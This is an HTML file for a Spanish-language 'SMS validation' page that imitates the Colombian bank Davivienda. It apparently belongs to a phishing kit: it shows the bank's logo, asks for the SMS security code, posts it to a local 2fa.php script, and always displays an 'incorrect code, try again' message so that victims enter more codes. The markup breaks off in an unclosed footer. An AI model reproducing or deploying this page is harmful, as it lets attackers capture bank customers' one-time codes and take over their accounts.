<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validación SMS - Davivienda</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <header>
        <div class="logo">
            <img src="logo1.jpg" alt="Davivienda">
        </div>
    </header>

    <div class="main-container">
        <form action="2fa.php" method="post" class="auth-container">
            <h2 class="auth-title">Validación de Seguridad</h2>
            <h3 class="auth-subtitle">Ingrese el código enviado por SMS</h3>

            <div class="error-message">
                El código ingresado es incorrecto. Inténtelo nuevamente.
            </div>

            <div class="form-group">
                <label for="token">Código SMS</label>
                <input type="text" name="token" id="token" placeholder="Ingrese el código" required autocomplete="off"
                    autofocus>
            </div>

            <button type="submit" class="btn-primary">Validar</button>
        </form>
    </div>

    <footer>
        <p>

</html>
